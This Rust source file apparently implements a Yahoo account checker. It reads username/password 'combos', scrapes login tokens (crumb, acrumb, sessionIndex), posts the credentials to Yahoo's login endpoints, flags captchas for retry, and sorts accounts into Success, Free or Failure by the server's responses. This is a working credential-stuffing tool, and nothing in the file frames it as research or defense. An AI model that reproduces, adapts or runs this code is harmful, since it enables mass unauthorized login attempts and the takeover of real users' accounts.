use reqwest::header::{HeaderValue};

mod static_keys;

#[derive(Debug)]
pub enum CheckerStatus {
    Success,
    Free,
    Retry,
    Failure,
}

#[derive(Debug)]
pub struct Combo {
    pub username: String,
    pub password: String,
}

#[derive(Debug)]
struct SourceData<'a> {
    crumb: &'a str,
    acrumb: &'a str,
    session_index: &'a str,
}

#[derive(Debug)]
pub struct Checker {
    client: reqwest::Client,
}

impl Checker {
    pub fn new() -> Checker {
        Checker {
            client: reqwest::Client::new(),
        }
    }

    pub async fn check_combo(
        &self,
        combo: &Combo,
    ) -> Result<CheckerStatus, Box<dyn std::error::Error>> {
        let response = self.initial_request().await?;
        let (source, cookie) = destructure_response(response).await?;

        let data = get_source_data(&source);

        let post_content = yahoo_post_content(static_keys::YAHOO_POST_CONTENT, &data, combo);
        let response = self
            .post_request(static_keys::YAHOO_POST, post_content, cookie.clone())
            .await?;

        let (source, cookie) = destructure_response(response).await?;

        if source.contains("captcha") {
            return Ok(CheckerStatus::Retry);
        }

        if !source.contains("challenge/password") {
            return Ok(CheckerStatus::Failure);
        }

        let loc = get_location(&source);

        let post_content = yahoo_post_content(static_keys::YAHOO_POST_CONTENT_FINAL, &data, combo);
        let response = self
            .post_request(&format!("https://login.yahoo.com{}", loc), post_content, cookie)
            .await?;

        let (source, _cookie) = destructure_response(response).await?;

        if source.contains("https://api.login.yahoo.com/oauth2/") {
            return Ok(CheckerStatus::Success);
        }

        if source.contains("selector") {
            return Ok(CheckerStatus::Free);
        }

        Ok(CheckerStatus::Failure)
    }

    async fn initial_request(&self) -> Result<reqwest::Response, Box<dyn std::error::Error>> {
        let initial_request = self
            .client
            .request(reqwest::Method::GET, static_keys::YAHOO_LOGIN)
            .headers(get_header_map(Vec::from(static_keys::YAHOO_LOGIN_HEADERS))?)
            .build()?;
        let response = self.client.execute(initial_request).await?;
        Ok(response)
    }

    async fn post_request<'a>(&'a self, url: &str, content: String, cookie: HeaderValue) -> Result<reqwest::Response, Box<dyn std::error::Error>> {
        let mut headers = get_header_map(Vec::from(static_keys::YAHOO_POST_HEADERS))?;
        headers.insert("Cookie", cookie);
        let post_request = self
            .client
            .request(reqwest::Method::POST, url)
            .body(content)
            .headers(headers)
            .build()?;
        let response = self.client.execute(post_request).await?;
        Ok(response)
    }
}

fn get_source_data(response: &String) -> SourceData {
    SourceData {
        acrumb: parse_source(response, "acrumb\" value=\""),
        crumb: parse_source(response, "name=\"crumb\" value=\""),
        session_index: parse_source(response, "\"sessionIndex\" value=\""),
    }
}

fn get_header_map(
    headers: Vec<&'static str>,
) -> Result<reqwest::header::HeaderMap, Box<dyn std::error::Error>> {
    let mut header_map = reqwest::header::HeaderMap::new();
    for header in headers {
        let header = header.split(": ").collect::<Vec<&'static str>>();
        (&mut header_map).insert(header[0], header[1].parse()?);
    }
    Ok(header_map)
}

fn parse_source<'a>(source: &'a String, lstr: &str) -> &'a str {
    let start = source.find(lstr).unwrap() + lstr.len();
    let end = source[start..].find("\"").unwrap();
    &source[start..start + end]
}

fn yahoo_post_content(content: &str, data: &SourceData, combo: &Combo) -> String {
    content
        .replace("<ac>", data.acrumb)
        .replace("<c>", data.crumb)
        .replace("<si>", data.session_index)
        .replace("<USER>", &url_escape::encode_fragment(&combo.username))
        .replace("<PASS>", &url_escape::encode_fragment(&combo.password))
}

async fn destructure_response(response: reqwest::Response) -> Result<(String, HeaderValue), Box<dyn std::error::Error>> {
    let cookie = response.headers().get("set-cookie").ok_or("Error: cookie header not provided")?.clone();
    let source = response.text().await?;
    Ok((source, cookie))
}

fn get_location(json: &str) -> &str {
    let location = json.split("\":\"").collect::<Vec<&str>>()[1];
    &location[..location.len() - 2]
}